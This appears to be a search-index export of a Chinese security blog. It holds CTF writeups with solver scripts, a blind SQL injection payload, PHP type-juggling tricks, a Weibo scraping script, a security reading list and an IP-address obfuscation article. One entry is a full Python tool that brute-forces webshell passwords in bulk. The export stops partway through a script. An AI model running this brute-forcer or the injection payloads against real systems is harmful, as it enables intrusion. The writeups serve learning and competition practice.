<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[N1CTF baby_N1ES writeup]]></title>
    <url>%2F180310N1CTFWP%2F</url>
    <content type="text"><![CDATA[baby_N1ES题目提供两个文件，challenge.py和N1ES.py 。 虽然似乎在模仿AES，但是实际上明文和密文是一一映射的，复杂度不是恶心的100^48 而只是100*48 ，穷举是很快的。一个小障碍是N1ES.py 第71行的L, R = R, L ，这导致了明文的[0:8] 、[8:16]、[16:24]、[24:32]、[32:40]、[40:48] 分别对应的是密文的[8:16]、[0:8] 、[24:32]、[16:24]、[40:48]、 [32:40] ，写穷举脚本时需要注意。 crack.py12345678910111213141516import base64,string,N1ESkey = "wxy191iss00000000000cute"c = base64.b64decode("HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx")n1es = N1ES.N1ES(key)f=""for i in xrange(3): for j in xrange(16): for k in string.printable: s="x"*i*16+"x"*j+k+"x"*(48-i*16-j-1) e=n1es.encrypt(s) check=c[i*16+j+8]==e[i*16+j+8] if j&lt;8 else c[i*16+j-8]==e[i*16+j-8] if check: f+=k breakprint f# N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; challenge.py1234567from N1ES import N1ESimport base64key = "wxy191iss00000000000cute"n1es = N1ES(key)flag = "N1CTF&#123;*****************************************&#125;"cipher = n1es.encrypt(flag)print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx N1ES.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding: utf-8 -*-def round_add(a, b): f = lambda x, y: x + y - 2 * (x &amp; y) res = '' for i in range(len(a)): res += chr(f(ord(a[i]), ord(b[i]))) return resdef permutate(table, block): return list(map(lambda x: block[x], table))def string_to_bits(data): data = [ord(c) for c in data] l = len(data) * 8 result = [0] * l pos = 0 for ch in data: for i in range(0,8): result[(pos&lt;&lt;3)+i] = (ch&gt;&gt;i) &amp; 1 pos += 1 return results_box = [54, 132, 138, 83, 16, 73, 187, 84, 146, 30, 95, 21, 148, 63, 65, 189, 188, 151, 72, 161, 116, 63, 161, 91, 37, 24, 126, 107, 87, 30, 117, 185, 98, 90, 0, 42, 140, 70, 86, 0, 42, 150, 54, 22, 144, 153, 36, 90, 149, 54, 156, 8, 59, 40, 110, 56,1, 84, 103, 22, 65, 17, 190, 41, 99, 151, 119, 124, 68, 17, 166, 125, 95, 65, 105, 133, 49, 19, 138, 29, 110, 7, 81, 134, 70, 87, 180, 78, 175, 108, 26, 121, 74, 29, 68, 162, 142, 177, 143, 86, 129, 101, 117, 41, 57, 34, 177, 103, 61, 135, 191, 74, 69, 147, 90, 49, 135, 124, 106, 19, 89, 38, 21, 41, 17, 155, 83, 38, 159, 179, 19, 157, 68, 105, 151, 166, 171, 122, 179, 114, 52, 183, 89, 107, 113, 65, 161, 141, 18, 121, 95, 4, 95, 101, 81, 156, 17, 190, 38, 84, 9, 171, 180, 59, 45, 15, 34, 89, 75, 164, 190, 140, 6, 41, 188, 77, 165, 105, 5, 107, 31, 183, 107, 141, 66, 63, 10, 9, 125, 50, 2, 153, 156, 162, 186, 76, 158, 153, 117, 9, 77, 156, 11, 145, 12, 169, 52, 57, 161, 7, 158, 110, 191, 43, 82, 186, 49, 102, 166, 31, 41, 5, 189, 27]def generate(o): k = permutate(s_box,o) b = [] for i in range(0, len(k), 7): b.append(k[i:i+7] + [1]) c = [] for i in range(32): pos = 0 x = 0 for j in b[i]: x += (j&lt;&lt;pos) pos += 1 c.append((0x10001**x) % (0x7f)) return cclass N1ES: def __init__(self, key): if (len(key) != 24 or isinstance(key, bytes) == False ): raise Exception("key must be 24 bytes long") self.key = key self.gen_subkey() def gen_subkey(self): o = string_to_bits(self.key) k = [] for i in range(8): o = generate(o) k.extend(o) o = string_to_bits([chr(c) for c in o[0:24]]) self.Kn = [] for i in range(32): self.Kn.append(map(chr, k[i * 8: i * 8 + 8])) return def encrypt(self, plaintext): if (len(plaintext) % 16 != 0 or isinstance(plaintext, bytes) == False): raise Exception("plaintext must be a multiple of 16 in length") res = '' for i in range(len(plaintext) / 16): block = plaintext[i * 16:(i + 1) * 16] L = block[:8] R = block[8:] for round_cnt in range(32): L, R = R, (round_add(L, self.Kn[round_cnt])) L, R = R, L res += L + R return res 签到IRC频道公告有字符串TjFDVEZ7V2VsYzBtZV90b19OMUNURl8yMDE4fQ ,base64解码后即flag。]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[收集整理一个人所有的微博]]></title>
    <url>%2F180309RetrieveWeiboPosts%2F</url>
    <content type="text"><![CDATA[项目地址在 https://github.com/findneo/TKposts 人生活在社区里，对一个常使用微博的人来说，微博记录和反映了他在一段时间内所接触的信息，思考的问题和表达的观点，是值得研究的。如果这个研究对象是一个优秀的人，这里面的价值可能比想象要大。 很显然，要做成收集整理一个人所有的微博 这件事，首先是收集，其次是整理。 收集主要想到有三种方式： 找现成工具（无趣，暂不考虑）。 在https://m.weibo.cn/u/14015127xxx 页面一直按END 键，然后页面会不断异步发送请求以增加页面内容，直到全部内容都被获取。 可以看到第二种方法中的请求是向https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1401527xxx&amp;containerid=1076031401527xxx&amp;page=1 发送GET请求，只需迭代page的参数即可得到所有数据。 方法二实践用如下简单脚本模拟按键行为，泡杯茶观察成果。 1234567891011import win32apiimport timeprint time.asctime()cnt=0while 1: cnt+=1 win32api.keybd_event(35, 0, 0, 0) #35 stands for "END" key; 0 means hold down win32api.keybd_event(35, 0, 1, 0) # 1 means hold up print cnt, time.sleep(2)print time.asctime() 发现按了几十下页面就开始不变化了，观察请求发现都是发给page=50的，想必是做了限制，最多获取50条记录，暂告失败。 方法三实践要用这个方法首先最好知道总共有多少page，用二分法手动测，很快就能发现目标用户共有1542个page的记录，然后写个脚本dump下这些响应，保存成json文件，以供后面处理即可。 1234567891011121314from requests import * from time import *import jsonprint asctime()url="https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=1401527xxx&amp;containerid=1076031401527xxx&amp;page="for i in range(1543,1,-1): u=url+str(i) f=open("result/%d.json"%i,'w+') f.write(get(u).content) f.close() sleep(2) if i%50==0: sleep(3)print asctime() 处理json分析响应结构，提取关键信息，构造文件汇总即可。代码见 GitHub 。 收获 了解了正则表达式的backreference和lazy mode 。 使用 json.load(file) 将json文件转换成字典。 数据编码问题可能导致写文件报错，可用f.write(data.encode(&#39;utf8&#39;)) 。 用with open(&quot;f1&quot;) as f1,open(&quot;f2&quot;) as f2: 打开多个文件。 每一个人作为数字公民的部分可能最后并不能留下太多痕迹，而且这些痕迹可能非常脆弱。当然，话说回来，这同线下生活也是相似的。]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络安全学习资料]]></title>
    <url>%2F180308NewbieSecurityList%2F</url>
    <content type="text"><![CDATA[项目地址在 Github：https://github.com/findneo/Newbie-Security-List Newbie-Security-List 一桌菜，十几盘，有荤有素，有凉有热，怎么吃呢？你可以找一盘看起来好吃的，也可以找一盘离自己近的，都行。但是，得动筷子。不管怎么吃，最重要的是得动筷子。学技术也是一样。 有的人死活不动筷子，还不断念叨：“我要开始吃了。我马上就要开始吃了。我只要开始吃就能吃饱。我吃饱了就不饿了。你能不能告诉我该先吃哪一盘？先冷盘后热菜再喝汤这样是不是最好？但是我听说广东人都是先喝汤？这盘菜会不会太远了？这盘会不会太油腻？我吃饱了万一想拉屎你们这里有厕所吗？我真的马上就要开始吃了……为什么我现在还是饿？你能不能帮帮我？” by tombkeeper @2017-11-28 乌云在线漏洞库/知识库 http://cb.drops.wiki/ http://wooyun.chamd5.org/ http://wooyun.jozxing.cc/ https://web.archive.org/web/20160628133257/http://www.wooyun.org:80/ （GFW） 在线知识库 https://superkieran.github.io/WooyunDrops/#!/ https://wooyun.js.org/ https://web.archive.org/web/20160628084846/http://drops.wooyun.org:80/ （GFW） 在线漏洞库 http://bug.p0sec.net/ https://web.archive.org/web/20160625075226/http://www.wooyun.org:80/bugs （GFW） 本地搭建B/S型https://github.com/hanc00l/wooyun_public 硬盘搜索型 链接: WooYun漏洞、知识库收集(超详细版) 密码: 28gr everything : search file by name on disk. agentransack/FileLocatorPro : search file by content on disk。 CTFBREAK &amp; WATCH文档 https://beginners.re/ https://leanpub.com/web-hacking-101 https://ctf-wiki.github.io/ctf-wiki/index.html https://www.pediy.com/kssd/ https://paper.seebug.org/ http://evilcos.me/security_skill_tree_basic/index.html https://book.nmask.cn/ GitHub https://github.com/jekil/awesome-hacking/ https://github.com/ctfs/ https://github.com/joe-shenouda/awesome-cyber-skills https://github.com/CHYbeta/Web-Security-Learning https://github.com/tom0li/collection-document 安全导航 https://navisec.it/ http://www.itxueke.com/SecNavi/ http://shentoushi.top/ 其他优秀资源 https://speakerdeck.com/search?utf8=%E2%9C%93&amp;q=ctf https://gotyour.pw/ https://skills.bugbank.cn/ https://hackmethod.com/roadmap/ https://highon.coffee/ https://silic.wiki/doku.php https://learnxinyminutes.com/ http://www.opensecuritytraining.info/ http://www.fuzzysecurity.com/index.html https://pentesterlab.com/bootcamp http://liveoverflow.com/ GET HANDS DIRTY练习平台 http://shell-storm.org/repo/CTF/ https://ctftime.org/ https://www.vulnhub.com/ https://exploit-exercises.com/ http://cryptopals.com/ http://overthewire.org https://pwnhub.cn/index https://cmdchallenge.com/ https://www.hackthissite.org/ https://microcorruption.com/login http://smashthestack.org/ http://pwnable.kr/ https://pwnable.tw/ http://www.underthewire.tech/ http://www.freebuf.com/sectool/4708.html http://www.hetianlab.com/ ONLINE JUDGE https://ringzer0team.com/ https://www.wechall.net/ https://backdoor.sdslabs.co/challenges https://www.jarvisoj.com/ https://ctf.katsudon.org/ctf4u/ https://www.onlinectf.com/challenges/ http://ksnctf.sweetduet.info/ http://ctf.nuptsast.com/ https://ctf.hackmethod.com/ http://oj.xctf.org.cn/ http://ctf.bugku.com/ http://ctf.rookiehacker.org/ http://www.shiyanbar.com/ctf/practice http://hackinglab.cn/ https://hackme.inndy.tw/ https://ctflearn.com/ https://ctf.katsudon.org/ FOR FUN http://www.heibanke.com/lesson/crawler_ex00/ http://web.onlinectf.com/cutezombie/web-app/ http://riddle.arthurluk.net/pocket.php http://fun.coolshell.cn/ http://monyer.com/game/game1/ 博客HACKERS https://whereisk0shl.top/ https://www.leavesongs.com/ http://www.cnblogs.com/iamstudy https://sigterm.ch/ http://xlab.tencent.com/cn/ https://strcpy.me/ https://ricterz.me/ http://www.blue-lotus.net/ http://217.logdown.com/ http://sh3ll.me/ http://jiangjiawei.pw/blog/ https://dog.xmu.edu.cn/ https://chybeta.github.io/ https://hackfun.org/ http://www.cnblogs.com/figure9/ http://blog.csdn.net/v_july_v http://mslc.ctf.su/ MIND HACKERS https://livid.v2ex.com/ https://www.byvoid.com/zhs/ http://mindhacks.cn/ http://www.matrix67.com/blog/ http://www.ruanyifeng.com/home.html http://www.yinwang.org/ https://www.scotthyoung.com/blog/ https://blog.youxu.info/ https://program-think.blogspot.com/ 工具搜索 https://google.com/ https://www.exploit-db.com/google-hacking-database/ http://search.chongbuluo.com/ http://www.xilinjie.com/ http://webcache.googleusercontent.com/search?q=cache:https://findneo.github.io https://web.archive.org/web/*/https://findneo.github.io 电子书籍 http://www.banshujiang.cn/ http://bestcbooks.com/ https://salttiger.com/archives/ https://www.it-ebooks.info/ http://www.oreilly.com/programming/free/ http://www.sxyj.net/ https://www.jiumodiary.com/ 安全相关 https://tools.pediy.com/ https://down.52pojie.cn/Tools/ https://www.ctftools.com/down/ https://github.com/zardus/ctf-tools https://github.com/P1kachu/v0lt https://www.zoomeye.org/ https://www.shodan.io/ https://fofa.so/ https://quipqiup.com/ http://factordb.com/ https://koczkatamas.github.io/]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>resources</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一句话快速爆破脚本]]></title>
    <url>%2F180304StealShell%2F</url>
    <content type="text"><![CDATA[思路来自爱春秋文章python之提速千倍爆破一句话 ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。 速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。 思路举例1234慢速：http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);快速：http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);&amp;findneo=echo(%22pwd:findneo%22); 用法12345678910Usage: stealshell.py [options]Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. "http://127.0.0.1/xiao.php") -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. "shell_pass_dic.txt") -n NUM the number of passwords that will be submitted in each request (219 is default) 依赖库 python2.7: requests,sys,getopt 效果如图 代码支持PHP和asp，asp部分没有搭环境测试，但只是payload简单替换，理论上是没有问题的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import requests as reqimport sysimport getopttoken="pwd"def usage(): print """################################################################################################### This is a script used to guess the pass of webshells rapidly (up to 40M each time). It supports php&amp;asp,GET&amp;POST. site: https://findneo.github.io/stealshell/###################################################################################################Usage: stealshell.py [options]Options: -h, --help display this message -u URL, --url=URL Target URL;This option must be provided to define the target (e.g. "http://127.0.0.1/xiao.php") -m METHOD request method (support GET/POST,GET is default ) -d DICT the filename of candidate passwords (e.g. "shell_pass_dic.txt") -n NUM the number of passwords that will be submitted in each request (219 is default) """def get_dict(dic_name="shell_pass_dic.txt",pcpt=4,shell_type="php"): with open(dic_name,'r') as f: c=f.readlines() print "\nthis dict has %d items in all"%len(c) cnt=len(c)/pcpt # pcpt is short for password_check_per_time sp=[] # split password by pcpt per group sp.extend([c[i*pcpt:i*pcpt+pcpt] for i in xrange(cnt)]) sp+=[c[cnt*pcpt:]] # sp: [['x\n', 'cmd\n', 'pass\n', 'pwd\n'], ['xiao\n', '584521\n', 'nohack\n', '45189946\n'], ...] print "we split it into %d groups (%d * %d + %d) and submit one group each time\n"%(len(sp),cnt,pcpt,len(c)-pcpt*cnt) spd=[] execute="echo" if shell_type=="php" else "response.write" spd.extend([&#123;j.strip('\n'):"%s('%s:%s');"%(execute,token,j) for j in i&#125;for i in sp]) # spd: [&#123;'x': "echo('pwd:x\n');", 'pass': "echo('pwd:pass\n');",...] return spddef check_pass(url,pwd_list,method): for i in pwd_list: r=req.get(url,params=i) if method=="GET" else req.post(url,data=i) print '.', if token in r.content: print "" return r.contentif __name__ == '__main__': try: options,left_args=getopt.getopt(sys.argv[1:],"hu:m:d:n:",["help","url="]) except Exception as e: raise e url="http://127.0.0.1/xiao.php" method="GET" dic_name="shell_pass_dic.txt" pass_num=219 if not len(options): exit(usage()) for name,value in options: if name in ("-h","--help"): exit(usage()) elif name in ("-u","--url"): url=value elif name in ("-m"): method=value elif name in ("-d"): dic_name=value elif name in ("-n"): pass_num=int(value) shell_type=url[-3:] pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type) print check_pass(url=url,pwd_list=pwd_list,method=method)]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“华为杯”极客出发XMan冬令营线上CTF解题赛]]></title>
    <url>%2F180107XmanCampOnlineWP%2F</url>
    <content type="text"><![CDATA[中二的成长之路 我用真心对你，你却用QR敷衍我。 附件下载 试试QR的哈希，并且注意红字。 使用图片显示的某些信息做哈希 再次观察图片，看看不一样的颜色和字体，也许需要做一下哈希 扫描题目给的图片得到3ukka4wZf2Q9H8PEI5YKFA== ，但直接base64解码得到乱码。谷歌搜索发现可能性很多，各种尝试无果。 使用binwalk分离出压缩包。不是伪加密，爆破也无果。 经过主办方提示看看不一样的颜色和字体 注意到AES，搜索发现与今年9月份的问鼎杯CTF一道题极为相似，就是压缩包的密码经过AES加密后再进行base64编码。这样就有了基本的思路。但还缺少一些信息，比如AES采用哪种模式，key是什么，如果有IV，又会是什么。 对着三次关于哈希 的提示，猜想做出来的哈希就是key，那么就不需要IV，那么就可能是ECB或CTR模式。但哈希是对谁做的呢，产生了很多联想，做了一些尝试无果。后来猛然发现，基本上能用来产生哈希用于AES加密并产生BASE64串的东西一定是在图片生成之前就存在。那么可能性就不多了，甚至没有了。比赛快结束前注意到试试QR的哈希 这一提示，不报什么希望地试了下字符串”QR”的哈希，没想到成了。解密后得到压缩包密码1Znmpr4jzChwxXqB 。 打开压缩包后迎面而来又一张QR，解出bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so= 。很容易想到这是要故技重施，又要找一串key。因为key可能是16、24或32字节，很自然想到上一次解密就试过的16个字节的文件名s776051080zum92N ，一试便成，得到XCTF{W0W_U_G0T_TH3_FL4G} 。 勉强拿到门票，即将和大佬们一起学习，有点兴奋：） 附上解题脚本： 123456789101112131415161718192021#coding:utf-8import base64,hashlibfrom Crypto.Cipher import AESkey = hashlib.md5('QR').hexdigest()secret="3ukka4wZf2Q9H8PEI5YKFA==" # 图片扫码结果def decrypt(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc)res=decrypt(base64.b64decode(secret))print len(res),res#-------------------------------------------key = "s776051080zum92N" #压缩包里面图片的文件名secret="bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=" #压缩包里图片是涨二维码，扫出来这个def decrypt2(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc)res=decrypt2(base64.b64decode(secret))print len(res),res#------运行结果--------------#16 1Znmpr4jzChwxXqB#32 XCTF&#123;W0W_U_G0T_TH3_FL4G&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第二届美亚柏科邀请赛]]></title>
    <url>%2F171223MeiyaCTFWP%2F</url>
    <content type="text"><![CDATA[WEBWEB2 Flag在哪里? 链 接 http://10sBB7f7sSo9.isec.anscen.cn burp抓包后向login.php常规 post user[]=admin&amp;pass[]=a&amp;submit=submit 。 得到flag{7538a033d41f442cbae9578d4c189615} 。 WEB4 你找得到Flag吗？ 链 接http://3jhg9aks3.isec.anscen.cn fuzz发现某些响应包头部会多出Set-Cookie: remind=U1FMSQ%3D%3D; 字样，依此进行布尔型盲注。 使用intruder的Cluster Bomb 模式自动化，攻击向量为content=b&#39;||substr((select/**/hex(database())),$1$,1)=&#39;$6$&#39;# 处理得到flag 123456789101112131415161718192021222324252627r='p'+'x'*100r=[i for i in r]c0=[32,42]# 表示数据的第32，42位是'0'c1=[6,18,30,70,72,76]c2=[40,60]c3=[11,15,21,23,25,31,33,35,37,38,41,43,45,49,51,54,57,61,65,67,73,74,75]c4=[14,20,56]c5=[16,28,36,46,48,68]c6=[1,2,3,5,7,13,17,19,22,27,29,39,44,47,53,55,59,63,64,69,71]c7=[8,9,12,24,52,62,77]c8=[26,50,58]c9=[34,66]ca=[]cb=[10]# 表示数据的第10位是'b'cc=[4]cd=[78]ce=[]cf=[]call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf]for i in xrange(len(call)): for j in call[i]: r[j]=hex(i)[2:]print ''.join(r)#666c61677b3764356164363738656130393533623036356538376364386237663935616133317d#flag&#123;7d5ad678ea0953b065e87cd8b7f95aa31&#125; 题外话：使用hex()编码待查询数据再进行注入会把数据长度增长一倍，但待选字符集大小将减少到十六个，对于像本题这样没法二分的情况很高效。对于可以二分查找的情况复杂度和直接注入是一样的，还可以避开不可见字符的干扰。 WEB5 还没找到flag么 链 接http://8ah3ka0akj.isec.anscen.cn 查看源码，循序渐进。 123456789101112131415161718192021222324252627282930313233view-source://http://8ah3ka0akj.isec.anscen.cn/?key1=php://input&amp;key2=skwerl11&amp;key3=665.99999999999999&amp;key4=99999999999999999999999999999999999999post Hello hacker!-----------------------------------------------------------------------Hello hacker! Do you want the flag?&lt;br&gt;&lt;!-- $k1=$_GET['key1']; $k2=$_GET['key2']; if(file_get_contents($k1)==="Hello hacker!")&#123; echo 'welcome! Hacker!&lt;br&gt;'; &#125;--&gt;sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjwelcome! Hacker!&lt;br&gt;&lt;!-- if(md5($k2)&gt;666666*666666) &#123; include('ctf.php'); &#125;--&gt;Come on, flag is coming&lt;br&gt;flag&#123;0fd14555a5d275b253aff1bae158ca7c&#125;&lt;!-- $k3=$_GET['key3']; $k4=$_GET['key4']; if(intval($k3)&lt;666) &#123; if($k3==666) &#123; echo 'Come on, flag is coming&lt;br&gt;'; if($k4&gt;0) &#123; if(intval($k3+$k4)&lt;666) echo $flag; &#125; &#125; &#125;--&gt; MISCMISC4 到底什么才是打开flag的正确姿势？ 链 接http://1e3g6S39v5M9.isec.anscen.cn 解压Misc_Flow.rar 得到flag.rar 和Hints.txt 两个文件，其中hint.txt 提示Blasting code???No No No!There is another txt file. ，尝试用alternatestreamview.exe 扫描文件夹，得到隐藏的流文件:password.txt:$DATA ，提取出内容是c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad 。 发现flag.rar 无法作为压缩包打开，修复文件头为正确的52617221 后将上面字符串作为密码即可打开，得到包含flag的图片。flag{43cca4b3de2097b9558efefb0ecc3588} MISC5 截获了一份敌军的流量包，据悉暗号就在里面 链 接http://2S8h7F84v4M0.isec.anscen.cn 过滤出ICMP包，按顺序排列，发现数据包长度可疑。 123a=[144,150,139,145,165,91,109,151,122,113,106,119,93,167]print ''.join([chr(i-42) for i in a])# flag&#123;1CmPG@M3&#125; MISC? can’t see anything 什么也看不见 感谢川大师傅提供思路。 1234567891011题图末尾有base32字符串解码后得到P4000000N500100010000000006050O405103QS28895O011SR103QS28895O011SR103QS288193084P30081001000000000000200N0478747R27616P6660000000000000002000000000000004200800000006200000062O2NO8Q84O413Q79500800090004100S12010O40510N6Q0Q8Q039292535P025PP3Q39P4P82O3053R4Q4N4537343R4631343Q4P47O63SNP494OPO4478747R27616P666000000800000006200000062O2NO8Q84O413Q7950080000000414030O405将NOPQRS依次替换为ABCDEF得到十六进制串C4000000A500100010000000006050B405103DF28895B011FE103DF28895B011FE103DF288193084C30081001000000000000200A0478747E27616C6660000000000000002000000000000004200800000006200000062B2AB8D84B413D79500800090004100F12010B40510A6D0D8D039292535C025CC3D39C4C82B3053E4D4A4537343E4631343D4C47B63FAC494BCB4478747E27616C666000000800000006200000062B2AB8D84B413D7950080000000414030B405将字符串反序，得到504B开头的字符串504B0304140000000800597D314B48D8BA2B260000002600000008000000666C61672E7478744BCB494CAF36B74C4D3431364E3437354A4D4E3503B28C4C93D3CC520C535292930D8D0D6A01504B01021F00140009000800597D314B48D8BA2B2600000026000000080024000000000000002000000000000000666C61672E7478740A00200000000000010018003C480391882FD301EF110B59882FD301EF110B59882FD301504B050600000000010001005A0000004C使用十六进制编辑器保存为rar文件打开可见flag.txt文件flag&#123;79ea433a752ece633a25cf6d1ddcc130&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP地址混淆]]></title>
    <url>%2F171125TextualRepresentationOfIPAddress%2F</url>
    <content type="text"><![CDATA[不知有多少人了解IP地址127.0.0.1 一定程度上是完全等价于127.1 和0x7f.1 的，不过我从上回看到ping 127.1 能正常工作开始，就一直很好奇背后的原因，最近又在 一个CTF题目 用到基于IP表示法的技巧，于是决定稍微探索一下。 我发现一个IPv4地址可能拥有上百个不同的表示形式，而由于一些历史原因，在这方面的标准尚未完全统一，因此这些形式在大部分情况下都是可被正常解析的(举个例子，URL http://000000300.0x000000000a8.00102.00000000351 会解析成http://192.168.66.233/ )，这就在绕过限制和其他一些安全问题上提供了想象的空间。 本文主要介绍这些混淆背后的历史原因和原理，至于如何生成适用形式的IP也不复杂，并且常常需要考虑具体场景。不过我写了个小脚本，放在了GitHub 上，有需要可作为参考。 关于IP和IPv4地址IPv4是应用于分组交换网络的无状态协议，是网际协议(Internet Protocol , IP)的第四个版本，也是第一个投入生产的版本，1983年开始首先应用在ARPANET项目中。 IP地址用以标记使用IP接入网络的设备。IPv4把IP地址定义为32位二进制数，可表示 2**32 约42亿个网络设备接口，早期使用分类网络(Classful Addressing)的方法划分为五类，随着IP地址需求的增长，这种分类法被无类别域间路由(Classless Inter-Domain Routing , CIDR)取代。【参见RFC 1517-1519】 IPv4 地址句法的历史与现状一个IPv4地址除了被机器解析外，还会用在很多需要人类阅读理解的地方，而一个32位二进制数(如11000000101010000100001011101001 )对人类是很不友好的，因此人们必然会需要某种文本描述(textual representation) 。我们现在最常见到的点分十进制表示法(dotted-decimal notation) 就是其一。什么是点分十进制呢？就是由点号分隔开的四个十进制数(如192.168.66.233 ） ，其中每个十进制数表示一个字节(octets , 八位二进制数)，较高有效位在左，较低有效位在右。 尽管从上面的描述我们可以了解到IPv4地址的常见形式，但是关于IP地址的文本描述具体应该如何，似乎从来没有严谨全面的定义。另一方面，IP作为互联网中较为基础的设施之一，常常不可避免地出现在各种协议的描述里，这些描述有时顺带也会提及IP地址的写法，但提法不尽相同，也并不足够强硬和严谨。这篇 文章 细数了一些RFC文档里出现过的描述 ，可以看到不同场景下出现过#127.0.0.1 、[127.0.0.1] 、127.000.000.001 等形式的写法。 当IETF版本的句法处于无意识发展时，BSD版本的句法悄然登场。一个权威的解释大概也不是那么重要，尤其是当一项技术的某种实现已经被广泛使用。对于IPv4地址而言，这个实现就是4.2BSD 。 4.2BSD 引入了名为inet_aton() 的用于将字符串解释为IP地址的函数，这个函数被广泛地复制和演绎，从而使得BSD版本的关于IP地址文本描述的句法成为了事实上的标准——能够被inet_aton() 解释即合标准。至于inet_aton() 接受哪些形式的IP地址，将在下文给出。 这里先简要谈谈这两种句法的异同。 相同点对于最大多数情况——不带前导0的点分十进制( dotted decimal octets with leading zeroes suppressed ) ，两者都是支持的。 不同点 BSD版本的许多句法IETF版本都不支持 最重要的。IETF版本的句法在所有表述中始终如一地暗示要将带有前导0的数字解释为十进制，而BSD版本的句法在实现中将带有前导0的数字解释为八进制。举个例子，前者认为192.168.1.011 等价于192.168.1.11 ，而后者认为等价于192.168.1.9 。 值得一提的是IPv6 的发展也对此产生了一定的影响。IPv6中的函数inet_pton() 在处理IPv4地址时只接受点分十进制，并且明确地拒绝了一些能够被inet_aton() 接受的句法。然而，对于是否接受前导0语焉不详。 此外，2005年的RFC 3986 提出取两者安全的公共子集作为严格的IP地址句法定义，形成倾向于IETF的标准，但同时保持对BSD实现的后向兼容。这个子集的定义如下，简单说就是用点号分隔的四个十进制数，禁止使用前导0。 12345678910111213A 32-bit IPv4 address is divided into four octets. Each octet isrepresented numerically in decimal, using the minimum possible numberof digits (leading zeroes are not used, except in the case of 0itself). The four encoded octets are given most-significant first,separated by period characters. IPv4address = d8 "." d8 "." d8 "." d8 d8 = DIGIT ; 0-9 / %x31-39 DIGIT ; 10-99 / "1" 2DIGIT ; 100-199 / "2" %x30-34 DIGIT ; 200-249 / "25" %x30-35 ; 250-255 inet_aton()允许哪些形式的IP地址 a single number giving the entire 32-bit address. dot-separated octet values. It also interpreted two intermediate syntaxes: octet-dot-octet-dot-16bits, intended for class B addresses octet-dot-24bits, intended for class A addresses. It also allowed some flexibility in how the individual numeric parts were specified. it allowed octal and hexadecimal in addition to decimal, distinguishing these radices by using the C language syntax involving a prefix “0” or “0x”, and allowed the numbers to be arbitrarily long. 归纳起来有这么几种情况 IP地址只有一个部分，表示为a ，每部分表示32位二进制数 IP地址有两个部分，表示为a.b ，a 表示8位二进制数，b 表示24位二进制数 IP地址有三部分，表示为a.b.c ，a 和b 各表示8位二进制数，c 表示16位二进制数 IP地址有四个部分，表示为a.b.c.d ，每部分表示8位二进制数 以及这么两个重点 每一个部分可以都有三种表示法，十进制、十六进制和八进制，用前缀表明进制。 每部分的数字可以是任意长度。（这意味着可以把077 和0xff 表示成000000077 和0x00000ff 等） 到此为止，可以看到127.1 属于上述第二种情况，最开始的疑惑也就不复存在。 这应该算是一个历史遗留问题，不过在未来一段时间内，在广泛涉及URL和IP地址的浏览器和许多应用层程序(如Ping、telnet、wget、curl、GET、HEAD等)中，符合BSD版本句法的IPv4地址表示形式仍然是可接受的，而这些表示可以多达上百种，就可能在一些安全问题上发挥出人意料的作用。 生成一个IP地址的上百种形式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# coding:utf8# by https://findneo.github.io/# ref: https://linux.die.net/man/3/inet_aton# https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02# https://tools.ietf.org/html/rfc3986# http://www.linuxsa.org.au/pipermail/linuxsa/2007-September/088131.htmlimport itertools as itimport randomip = '192.168.66.233'i = ip.split('.')def f(x): return hex(int(x))[2:].zfill(2)hi = [f(i[0]), f(i[1]), f(i[2]), f(i[3]), # hi[4]:part c of "a.b.c" f(i[2]) + f(i[3]), # hi[5]:part b of "a.b" f(i[1]) + f(i[2]) + f(i[3]), # hi[6]:'a' f(i[0]) + f(i[1]) + f(i[2]) + f(i[3]), ]def hex2oct(x): """ arbitrary length is supported """ moreZero = random.choice(range(10)) return 